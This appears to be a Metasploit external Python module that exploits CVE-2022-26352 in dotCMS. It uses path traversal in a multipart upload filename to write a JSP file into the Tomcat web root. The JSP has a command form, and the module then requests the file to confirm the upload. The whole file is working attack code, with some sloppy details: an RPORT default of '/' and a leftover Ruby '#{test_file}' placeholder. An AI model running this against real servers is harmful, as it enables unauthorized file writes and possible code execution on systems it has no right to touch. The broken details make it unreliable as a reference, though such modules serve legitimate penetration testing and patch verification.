#!/usr/bin/env python3

# standard modules
from metasploit import module

# extra modules
dependencies_missing = False
try:
    import requests
    import urllib3
    import sys
    import time
    urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
except ImportError:
    dependencies_missing = True

metadata = {
    'name': 'DotCMS RCE via Arbitrary File Upload.',
    'description': '''
        When files are uploaded into dotCMS via the content API, but before they become content, dotCMS writes the
          file down in a temp directory.  In the case of this vulnerability, dotCMS does not sanitize the filename
          passed in via the multipart request header and thus does not sanitize the temp file's name.  This allows a
          specially crafted request to POST files to dotCMS via the ContentResource (POST /api/content)  that get
          written outside of the dotCMS temp directory.  In the case of this exploit, an attacker can upload a harmless
          .jsp file to the webapp/ROOT directory of dotCMS.
    ''',
    'authors': [
        'yuting',
    ],
    'date': '2022-07-07',
    'license': 'MSF_LICENSE',
    'references': [
                                {'type': 'url', 'ref': 'https://github.com/jheysel-r7/metasploit-framework/blob/dotcms_file_upload_rce/modules/exploits/multi/http/dotcms_file_upload_rce.rb'},
        {'type': 'cve', 'ref': '2022-26352'}
    ],
    'type': 'single_scanner',
    'options': {
        'RPORT': {'type': 'int', 'description': 'Target port', 'required': True, 'default': '/'},
        'TARGETURI': {'type': 'string', 'description': 'The base path', 'required': True, 'default': '/'},
        'METHOD': {'type': 'string', 'description': 'Vulunarable HTTP method', 'required': True, 'default': 'POST'}
    }
}

def find_base_url(args):
    base_url = 'https://{}:{}'.format(args['rhost'], args['RPORT'])
    return base_url

def make_shell():
    shell = """<FORM>
    <INPUT name='cmd' type=text>
    <INPUT type=submit value='Run'>
</FORM>
<%@ page import="java.io.*" %>
    <%
        File jsp=new File(getServletContext().getRealPath(File.separator) + File.separator + "#{test_file}");
        jsp.delete();
%>
    """
    return shell

def exploit(base_url,url,files):
    #https://{ip}:{port}/dotAdmin
    try:
        r = requests.get(url,verify=False,timeout=3)
    except Exception as e:
        module.log(str(e), level='error')
        return False
    module.log('Target is Valid', level='good')

    new_url = base_url + "/api/content/"
    try:
        response = requests.post(new_url , files=files, verify=False)
    except Exception as e:
        module.log('/api/content/ error', level='error')
        module.log(str(e), level='error')
        return False
    #print(response.status_code)

    url = base_url + "/abc.jsp"
    try:
        r = requests.get(url,verify = False)
        if r and r.status_code == 200:
            module.log('Successfully upload abc.jsp', level='good')
    except Exception as e:
        module.log('Failed to upload abc.jsp', level='error')
        return False

    return True

def run(args):
    try:
        # dependency check
        if dependencies_missing:
            module.log('Module dependency (requests) is missing, cannot continue', level='error')
            return

        base_url = find_base_url(args)
        shell = make_shell()
        files = {f"../../../../../../../../../srv/dotserver/tomcat-9.0.41/webapps/ROOT/html/js/dojo/abc.jsp": shell}

        url = base_url + "/dotAdmin"

        if exploit(base_url,url,files) :
            module.log('Exploit completed', level='good')
        else:
            module.log('Exploit failed', level='error')

    except Exception as e:
        module.log(str(e), level='error')

if __name__ == '__main__':
    module.run(metadata, run)